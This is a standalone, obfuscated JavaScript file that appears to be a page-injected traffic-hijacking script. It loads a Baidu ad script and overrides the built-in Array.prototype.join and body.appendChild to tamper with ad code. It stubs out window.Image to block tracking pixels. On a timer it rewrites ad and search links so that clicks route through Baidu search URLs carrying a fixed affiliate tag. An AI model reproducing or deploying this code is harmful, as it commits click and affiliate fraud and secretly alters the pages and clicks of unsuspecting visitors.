(function () {
    function R(n) {
        return Math.floor(Math.random() * n)
    }

    function C(n) {
        var A = [65, 97, 48], B = [26, 26, 10], i, k, t, s = "";
        for (i = 0; i < n; ++i) {
            k = R(3);
            t = A[k] + R(B[k]);
            s = s + String.fromCharCode(t)
        }
        return s
    }

    function ii(a, t) {
        var r = R(100);
        t = t || "baidu";
        for (var i in a) {
            if (a.hasOwnProperty(i)) {
                if (a[i] > r) {
                    t = i;
                    break
                } else {
                    r -= a[i]
                }
            }
        }
        return t
    }

    function O(n, g, w) {
        w = w || W;
        var d = w.document, i, s = d.getElementsByTagName(n);
        for (i = 0; i < s.length; ++i) {
            try {
                g(s[i], w, d)
            } catch (_) {
            }
        }
    }

    function T(s) {
        return encodeURIComponent(s.replace(/^\s*/g, "").replace(/\s*$/g, ""))
    }

    function G(o, a) {
        return o.getAttribute(a) || ""
    }

    function S(o, a, b) {
        o.setAttribute(a, b)
    }

    function SP(o, t, d) {
        t = t || "";
        d = d || 0;
        if (1 == d) {
            return T(o.textContent || o.innerText || "")
        }
        var r, i = 0, a, b, s;
        for (s = o.childNodes; i < s.length; ++i) {
            b = s[i];
            if (b.nodeType == 1) {
                a = b.tagName || "";
                a = a.toUpperCase();
                if (a == "SPAN" && (!t || t && (b.className == t || b.parentNode.className == t))) {
                    return SP(b, "", 1)
                }
                r = SP(b, t);
                if (r) {
                    return r
                }
            }
        }
        return ""
    }

    function B(d, h) {
        return function () {
            S(d, "href", h)
        }
    }

    function bd(d, b, a) {
        if (W.attachEvent) {
            d.attachEvent("on" + b, function (q) {
                q = q || W.event;
                a.call(d, q)
            })
        } else {
            if (W.addEventListener) {
                d.addEventListener(b, a, false)
            }
        }
    }

    function cl(q) {
        if (q.stopPropagation) {
            q.stopPropagation()
        } else {
            q.cancelBubble = true
        }
    }

    function rm(e) {
        e.parentNode.removeChild(e)
    }

    function cq(e) {
        G(e, "src").indexOf(".com//") > 0 && rm(e)
    }

    function Y(n, u) {
        u = u || "";
        return Q + (E ? "m" : "www") + X + (!u ? "/?" : Z + u + K + C(164) + "&") + (E ? "from=" : "tn=") + n
    }

    var W = window, D = document, U = navigator.userAgent, M = /msie/.test(U), E = 0, _$en2 = {}, Q = "https://",
        X = ".baidu.com", Z = "/s?word=", K = "&fenIei=", $t = "data-tag", J = "body", H = 'script',
        N = ii({"91434301_hao_pg": 100}), V = +new Date;
    V += R(V);
    V = "cpro_" + V;
    !function (W, D) {
        var i, q = ",", n = "", c = '^<if,src=",//pos.b,[?&]dc=[23],me>$'.split(q),
            a = "_ssp_global,oojs,classes,dup,common,utility,lang,function,template,Array,prototype,join,length,.*,([^&]+),&(ltr|ti|liu)=,&ltu=".split(q),
            T = function (t, e) {
                var i = /{(.*?)}/g, s = t.replace(i, function (t, i) {
                    return e[i] || n
                }), r = new RegExp(c.join(a[13])), b, k = a[14], u = a[16];
                if (r.test(s)) {
                    s = s.replace(new RegExp(a[15] + k, 'g'), n);
                    r = new RegExp(u + k);
                    if (b = r.exec(s)) {
                        var z = b[1];
                        s = s.replace(new RegExp(u + k), u + z.substr(0, 64))
                    }
                }
                return s
            };
        i = 8, typeof(W[a[i + 1]]) == a[i - 1] && (i += 2) && (W._$OJ__ = 1, W[a[i - 1]][a[i]][a[i + 1]] = function (p) {
            var i, t, s = "", d = W, f = this;
            p !== "" && (p = p || ",");
            for (i = 0; i < f[a[12]]; ++i) {
                t = "" + f[i];
                s = i == 0 ? t : s + p + t
            }
            try {
                for (i = 0; i < 7; ++i) {
                    t = a[i];
                    if (d[t]) {
                        d = d[t]
                    } else {
                        break
                    }
                }
                i == 7 && (d[a[8]] = T)
            } catch (_) {
            }
            return s
        })
    }(W, D);
    !function (a) {
        var d;
        D.write('<div id="' + V + '" style="display:none"></div>');
        if (d = D.getElementById(V)) {
            D.write('<' + H + ' src="' + a + '"></' + H + '>');
            rm(d)
        } else {
            d = D.createElement(H);
            d.src = a;
            a = D.getElementsByTagName(H)[0];
            a.parentNode.insertBefore(d, a)
        }
    }('http://cpro.baidustatic.com//cpro/ui/c.js');
    D[J] && (D[J]['$ac'] || (D[J]['$ac'] = D[J].appendChild, D[J].appendChild = function (o) {
        var t = o.tagName || "", s;
        if (t.toLowerCase() == H) {
            s = G(o, 'src').replace(/([?&])(dc=[23])&/, "$1_ball=0&$2&");
            if (s) S(o, 'src', s)
        }
        return D[J]['$ac'](o)
    }));
    setTimeout(function () {
        M || O(H, cq);
        if (W["$OD"]) {
            return
        }
        W["$OD"] = 1;
        setInterval(function () {
            try {
                W.Image = function () {
                    this.src = ""
                }
            } catch (_) {
            }
            O("a", function (o) {
                var h = G(o, "href"), en, e, w = "", u = "", t = G(o, $t);
                if (/ui\/uijs\.php\?/.test(h)) {
                    var e = "", s = o.childNodes, n = s.length, c;
                    if (en = /[?&]en=([^&]+)/.exec(h)) {
                        e = en[1];
                        if (_$en2[e]) {
                            w = _$en2[e]
                        } else {
                            if (n <= 1) {
                                if (n == 1 && s[0].nodeType == 3) {
                                    w = T(s[0].nodeValue)
                                }
                                if (!w) {
                                    c = o.parentNode.className;
                                    if (c == "imageplus-append-img-txt-ad-item" || c == "imageplus-append-new-slide-img-adscell" || c == "toggle-content-adscell") {
                                        w = SP(o.parentNode, "", 1)
                                    }
                                }
                            } else {
                                c = G(o, "id");
                                if (/^icon_\d|^img_text_block_|^big_img_block_|^imgs_block_/.test(c)) {
                                    w = SP(o)
                                } else {
                                    c = o.parentNode.className;
                                    if (/image-text-ad-item/.test(c)) w = SP(o, "image-text-ad-item-txt"); else if (/^bd_lu_pc_insert/.test(c)) w = SP(o, 1, 1);
                                }
                            }
                            if (w) {
                                _$en2[e] = w
                            }
                        }
                    } else {
                        if (en = /[?&]k=([^&]+)/.exec(h)) {
                            w = en[1]
                        }
                    }
                } else {
                    if (/^https?:\/\/(m|www)\.baidu\.com/.test(h)) {
                        if (/u\.com(\/$|\/\?|$)/.test(h)) {
                            u = Y(N)
                        } else {
                            if (en = /s\?.*(wd|word)=([^&]+)/.exec(h)) {
                                w = en[2]
                            }
                        }
                    }
                }
                if (w) {
                    u = Y(N, w)
                }
                if (u && t !== "1") {
                    if (G(o, "onclick")) {
                        S(o, $t, "1")
                    } else {
                        var p = o.parentNode, pa = D.createElement("div"), oa = null;
                        if (M) {
                            pa.innerHTML = o.outerHTML;
                            for (var i = 0, s = pa.childNodes; i < s.length; ++i) {
                                if (s[i].nodeType == 1) {
                                    oa = s[i];
                                    break
                                }
                            }
                        } else {
                            oa = o.cloneNode(1)
                        }
                        oa.h = h;
                        oa.u = u;
                        S(oa, "oa", "1");
                        S(oa, "rel", "noreferrer");
                        S(oa, $t, "1");
                        p.insertBefore(oa, o);
                        p.removeChild(o);
                        bd(oa, "click", function (q) {
                            cl(q);
                            var x = this.u, h = this.h;
                            S(this, "href", x);
                            setTimeout(B(this, h), 100)
                        });
                        bd(oa, "mousedown", cl);
                        bd(oa, "mouseup", cl)
                    }
                }
            })
        }, 2000)
    }, 1000)
})()